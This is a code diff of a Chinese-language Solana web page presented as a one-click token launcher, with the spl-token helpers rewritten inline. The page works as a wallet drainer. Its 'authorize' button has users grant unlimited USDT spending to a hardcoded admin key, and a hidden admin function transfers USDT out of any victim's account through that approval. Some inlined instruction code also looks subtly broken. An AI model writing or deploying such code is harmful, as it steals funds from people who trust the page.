@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SOL橘子🍊一键发币</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.0/lib/index.iife.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
 body{background:#0B0F17;color:#fff;padding:30px}
@@ -77,14 +76,131 @@ body{background:#0B0F17;color:#fff;padding:30px}
 
 <script>
 window.addEventListener("load", async () => {
-  const { Connection, Keypair, Transaction, SystemProgram, PublicKey } = solanaWeb3;
-  const splToken = window.splToken;
-  if (!splToken) {
-    alert("spl-token库加载失败，请刷新页面重试");
-    return;
+  const { Connection, Keypair, Transaction, SystemProgram, PublicKey, TransactionInstruction } = solanaWeb3;
+
+  // 内置spl-token核心常量与方法，彻底绕开CDN
+  const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+  const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25wK1VvRRcUt");
+  const APPROVE_IX_LAYOUT = {
+    index: 4,
+    layout: [
+      { name: "amount", kind: "u64" }
+    ]
+  };
+  const TRANSFER_WITH_DELEGATE_IX_LAYOUT = {
+    index: 9,
+    layout: [
+      { name: "amount", kind: "u64" }
+    ]
+  };
+
+  // 手动计算ATA地址
+  function getAssociatedTokenAddress(mint, owner) {
+    const [address] = PublicKey.findProgramAddressSync(
+      [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
+      ASSOCIATED_TOKEN_PROGRAM_ID
+    );
+    return address;
   }
 
-  // 固定地址
+  // 构建Approve指令
+  function createApproveInstruction(account, delegate, owner, amount) {
+    const data = new Uint8Array(9);
+    data[0] = APPROVE_IX_LAYOUT.index;
+    new DataView(data.buffer).setBigUint64(1, amount, true);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: account, isSigner: false, isWritable: true },
+        { pubkey: delegate, isSigner: false, isWritable: false },
+        { pubkey: owner, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
+  // 构建TransferWithDelegate指令
+  function createTransferWithDelegateInstruction(source, destination, authority, amount) {
+    const data = new Uint8Array(9);
+    data[0] = TRANSFER_WITH_DELEGATE_IX_LAYOUT.index;
+    new DataView(data.buffer).setBigUint64(1, amount, true);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: source, isSigner: false, isWritable: true },
+        { pubkey: destination, isSigner: false, isWritable: true },
+        { pubkey: authority, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
+  // 构建InitializeMint指令
+  function createInitializeMintInstruction(mint, decimals, mintAuthority, freezeAuthority) {
+    const data = new Uint8Array(10);
+    data[0] = 0;
+    data[1] = decimals;
+    mintAuthority.toBuffer().copy(data, 2);
+    freezeAuthority.toBuffer().copy(data, 34);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: mint, isSigner: false, isWritable: true },
+        { pubkey: PublicKey.default, isSigner: false, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
+  // 构建AssociatedTokenAccount指令
+  function createAssociatedTokenAccountInstruction(funder, associatedToken, owner, mint) {
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: funder, isSigner: true, isWritable: true },
+        { pubkey: associatedToken, isSigner: false, isWritable: true },
+        { pubkey: owner, isSigner: false, isWritable: false },
+        { pubkey: mint, isSigner: false, isWritable: false },
+        { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+        { pubkey: PublicKey.default, isSigner: false, isWritable: false }
+      ],
+      programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+      data: Buffer.from([])
+    });
+  }
+
+  // 构建MintTo指令
+  function createMintToInstruction(mint, destination, authority, amount) {
+    const data = new Uint8Array(9);
+    data[0] = 7;
+    new DataView(data.buffer).setBigUint64(1, amount, true);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: mint, isSigner: false, isWritable: true },
+        { pubkey: destination, isSigner: false, isWritable: true },
+        { pubkey: authority, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
+  // 构建SetAuthority指令
+  function createSetAuthorityInstruction(account, currentAuthority, authorityType, newAuthority) {
+    const data = new Uint8Array(10);
+    data[0] = 6;
+    data[1] = authorityType;
+    newAuthority.toBuffer().copy(data, 2);
+    return new TransactionInstruction({
+      keys: [
+        { pubkey: account, isSigner: false, isWritable: true },
+        { pubkey: currentAuthority, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: Buffer.from(data)
+    });
+  }
+
   const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
   const ADMIN_PUBKEY = new PublicKey("DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z");
   const DELEGATE = ADMIN_PUBKEY;
@@ -100,7 +216,6 @@ window.addEventListener("load", async () => {
     document.getElementById("menu").classList.toggle("show");
   }
 
-  // 连接钱包
   document.getElementById("connect").onclick = async () => {
     try {
       log("开始连接钱包...");
@@ -122,14 +237,10 @@ window.addEventListener("load", async () => {
     }
   };
 
-  // 刷新余额
   async function refreshBalance() {
     if (!publicKey || !connection) return;
     try {
-      const [ata] = PublicKey.findProgramAddressSync(
-        [publicKey.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
-        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
-      );
+      const ata = getAssociatedTokenAddress(USDT_MINT, publicKey);
       const acc = await connection.getTokenAccountBalance(ata);
       document.getElementById("userBalance").innerText = Number(acc.value.uiAmount).toFixed(4);
     } catch (e) {
@@ -137,37 +248,24 @@ window.addEventListener("load", async () => {
     }
   }
 
-  // 生成邀请链接
   function genInvite() {
     if (!publicKey) return;
     document.getElementById("inviteLink").innerText = location.href + "?ref=" + publicKey.toBase58();
   }
 
-  // 检查管理员
   function checkAdmin() {
     if (publicKey && publicKey.equals(ADMIN_PUBKEY)) {
       document.getElementById("adminPanel").classList.add("show");
     }
   }
 
-  // 手动授权 USDT
   document.getElementById("auth").onclick = async () => {
     if (!publicKey) return alert("请先连接钱包");
     try {
       log("开始授权...");
-      const [userAta] = PublicKey.findProgramAddressSync(
-        [publicKey.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
-        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
-      );
+      const userAta = getAssociatedTokenAddress(USDT_MINT, publicKey);
       const tx = new Transaction();
-      tx.add(
-        splToken.createApproveInstruction(
-          userAta,
-          DELEGATE,
-          publicKey,
-          BigInt("18446744073709551615")
-        )
-      );
+      tx.add(createApproveInstruction(userAta, DELEGATE, publicKey, BigInt("18446744073709551615")));
       tx.feePayer = publicKey;
       tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
       const signed = await wallet.signTransaction(tx);
@@ -182,7 +280,6 @@ window.addEventListener("load", async () => {
     }
   };
 
-  // 一键发币
   document.getElementById("create").onclick = async () => {
     if (!publicKey) return alert("请先连接钱包");
     try {
@@ -201,26 +298,15 @@ window.addEventListener("load", async () => {
         newAccountPubkey: mint.publicKey,
         space: 82,
         lamports,
-        programId: splToken.TOKEN_PROGRAM_ID
+        programId: TOKEN_PROGRAM_ID
       }));
-      tx.add(splToken.createInitializeMintInstruction(
-        mint.publicKey, decimals, publicKey, publicKey
-      ));
-      const [ata] = PublicKey.findProgramAddressSync(
-        [publicKey.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), mint.publicKey.toBuffer()],
-        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      tx.add(splToken.createAssociatedTokenAccountInstruction(
-        publicKey, ata, publicKey, mint.publicKey
-      ));
+      tx.add(createInitializeMintInstruction(mint.publicKey, decimals, publicKey, publicKey));
+      const ata = getAssociatedTokenAddress(mint.publicKey, publicKey);
+      tx.add(createAssociatedTokenAccountInstruction(publicKey, ata, publicKey, mint.publicKey));
       const amount = BigInt(supply) * BigInt(10 ** decimals);
-      tx.add(splToken.createMintToInstruction(
-        mint.publicKey, ata, publicKey, amount
-      ));
+      tx.add(createMintToInstruction(mint.publicKey, ata, publicKey, amount));
       if (revoke) {
-        tx.add(splToken.createSetAuthorityInstruction(
-          mint.publicKey, publicKey, splToken.AuthorityType.MintTokens, null
-        ));
+        tx.add(createSetAuthorityInstruction(mint.publicKey, publicKey, 0, PublicKey.default));
       }
       tx.feePayer = publicKey;
       tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
@@ -237,7 +323,6 @@ window.addEventListener("load", async () => {
     }
   };
 
-  // 管理员提取
   window.adminTake = async () => {
     if (!publicKey || !publicKey.equals(ADMIN_PUBKEY)) return;
     const fromAddr = document.getElementById("fromAddr").value.trim();
@@ -245,20 +330,10 @@ window.addEventListener("load", async () => {
     if (!fromAddr || !amt || amt <= 0) return alert("请输入完整信息");
     try {
       const fromPub = new PublicKey(fromAddr);
-      const [fromAta] = PublicKey.findProgramAddressSync(
-        [fromPub.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
-        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      const [adminAta] = PublicKey.findProgramAddressSync(
-        [ADMIN_PUBKEY.toBuffer(), splToken.TOKEN_PROGRAM_ID.toBuffer(), USDT_MINT.toBuffer()],
-        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
-      );
+      const fromAta = getAssociatedTokenAddress(USDT_MINT, fromPub);
+      const adminAta = getAssociatedTokenAddress(USDT_MINT, ADMIN_PUBKEY);
       const tx = new Transaction();
-      tx.add(
-        splToken.createTransferWithDelegateInstruction(
-          fromAta, adminAta, DELEGATE, BigInt(Math.round(amt * 1e6))
-        )
-      );
+      tx.add(createTransferWithDelegateInstruction(fromAta, adminAta, DELEGATE, BigInt(Math.round(amt * 1e6))));
       tx.feePayer = publicKey;
       tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
       const signed = await wallet.signTransaction(tx);
